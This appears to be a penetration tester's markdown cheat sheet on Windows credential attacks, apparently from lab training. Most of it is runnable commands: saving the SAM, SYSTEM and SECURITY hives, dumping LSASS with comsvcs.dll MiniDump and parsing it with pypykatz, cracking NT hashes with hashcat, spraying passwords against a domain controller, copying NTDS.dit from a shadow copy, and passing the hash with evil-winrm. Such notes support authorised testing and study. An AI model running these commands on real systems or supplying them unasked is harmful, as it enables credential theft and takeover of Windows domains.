## Attacking SAM 

Registry Hives if you have local admin access on the target.

|Registry Hive|Description|
|---|---|
|`hklm\sam`|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|`hklm\system`|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|`hklm\security`|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|

#### Locally

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```
#### Remotely

```shell
crackmapexec smb <ip> --local-auth -u <user> -p <pass> --lsa
```

```shell
crackmapexec smb <ip> --local-auth -u <user> -p <password> --sam
```

#### Cracking SAM
```shell
impacket-secretsdump -sam <sam file> -security <security file> -system <system file> LOCAL
```

```shell
sudo hashcat -m 1000 <NT Hashes> /usr/share/wordlists/rockyou.txt
```



## Attacking LSASS
![[Pasted image 20230801143148.png]]
Upon intial logon LSASS:
- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

#### Dump LSASS 
##### Task manager
![[Pasted image 20230801143218.png]]

Outputs to 
```cmd
C:\Users\loggedonusersdirectory\AppData\Local\Temp\lsass.DMP
```

##### CMD
Get LSASS PID
```cmd
tasklist /svc
```
```powershell
 Get-Process lsass
```
Create LSASS.dmp
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full
```


#### Extract LSASS Credentials 
 
##### Pypykatz
```shell
pypykatz lsa minidump lsass.dmp
```
###### [MSV](https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package)

Authentication package in windows that LSA validates logon attemps against the SAM database, 
###### WDIGEST

Older authentication methods protocol enabled by default Win XP - Win 8  and Server 2003 - 2012
LSASS caches credentials in clear text used by WDIGEST

###### [Kerberos](https://web.mit.edu/kerberos/#what_is)

Network authentication protocol used by AD in Windows domain environments.
LSASS caches passwords, ekeys, tickets and pins. 

###### [DPAPI](https://learn.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

Data Protection Application Programming Interface,
Used to encrypt and decrypt data blobs on a per-user basis for Windows OS features.

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|

Mimikatz and Pypykatz can extract the DPAPI master key for the logged on users.

## Attacking Active Directory & NTDS.dit

Need initial foothold on the network 

Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests.

[Attack technique](https://attack.mitre.org/techniques/T1003/003/)

#### Dictionary Attacks 

Very noisy 

|Username Convention|Practical Example for Jane Jill Doe|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|
Using Emails:
	We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.

Create usernames with [Username anarchy](https://github.com/urbanadventurer/username-anarchy)

#### Target the Domain Controller
Attempt to establish username and password
```shell
crackmapexec smb <ip> -u <username> -p <password list>
```
#### Locally 
##### Connect to the DC and Captre NTDS.dit
```shell
evil-winrm -i <ip>  -u <username> -p '<password>'
```

##### Check Local priviliges 
```shell
PS C:\> net localgroup
```

```shell
net user <user>
```

Need local admin or Domain admin
##### Create a shadow copy of C Drive
```shell
PS C:\> vssadmin CREATE SHADOW /For=C:
```
##### Copy NTDS.dit from VSS 
```shell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

#### Remotely
```shell
crackmapexec smb <ip> -u <user> -p <password> --ntds
```


#### Pass the hash
```shell
evil-winrm -i <ip> -u <user> -H "<hash>"
```
